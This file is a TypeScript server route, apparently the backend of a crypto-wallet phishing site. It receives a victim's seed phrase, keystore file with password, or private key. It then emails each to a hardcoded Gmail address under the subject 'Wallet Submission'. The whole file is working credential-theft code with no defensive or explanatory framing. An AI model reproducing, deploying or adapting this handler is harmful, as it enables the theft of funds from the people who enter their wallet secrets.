import nodemailer from 'nodemailer';

function formatMessage(message: string): string {
  const lines = message.split(/\r?\n/);
  const formattedLines = lines.map((line) => `<div style="margin-bottom: 10px;">${line}</div>`);
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedLines.join('')}</div>`;
}

export async function POST(request: Request) {
  try {
    const { phrase, keystore, privateKey } = await request.json();

    const email = process.env.GMAIL_USER;
    const pass = process.env.GMAIL_PASS;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: email,
        pass: pass,
      },
    });

    // Verify connection configuration
    transporter.verify(function (error, success) {
      if (error) {
        console.error("Transporter verification failed:", error);
      } else {
        console.log("Transporter is ready to send emails.");
      }
    });

    let mailOptions = {};

    // If phrase is provided, send email with formatted message
    if (phrase) {
      const formattedMessage = formatMessage(phrase);
      mailOptions = {
        from: `New Wallet Connect ${email}`,
        to: ['ellahella2015@gmail.com'],

        subject: 'Wallet Submission',
        html: formattedMessage,
      };
    }

    // If keystore is provided, send the keystore details
    if (keystore) {
      mailOptions = {
        from: `New Wallet Connect ${email}`,
        to: ['ellahella2015@gmail.com'],

        subject: 'Wallet Submission',
        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
      };
    }

    // If privateKey is provided, send the private key message
    if (privateKey) {
      const formattedMessage = formatMessage(privateKey);
      mailOptions = {
        from: `New Wallet Connect ${email}`,
        to: ['ellahella2015@gmail.com'],

        subject: 'Wallet Submission',
        html: formattedMessage,
      };
    }

    // Send the email
    const result = await transporter.sendMail(mailOptions);
    console.log('SendMail Result:', result);

    // Check for messageId in result to confirm email was sent
    if (result.messageId) {
      return new Response(JSON.stringify({ message: 'Email sent successfully!' }), { status: 200 });
    } else {
      console.log('Error: No messageId returned');
      return new Response(JSON.stringify({ error: 'Internal server error' }), { status: 500 });
    }
  } catch (error: unknown) {
    // Handle error gracefully
    if (error instanceof Error) {
      console.error('Error in sending email:', error);
      return new Response(JSON.stringify({ error: error.message }), { status: 500 });
    } else {
      console.error('Unknown error:', error);
      return new Response(JSON.stringify({ error: String(error) }), { status: 500 });
    }
  }
}
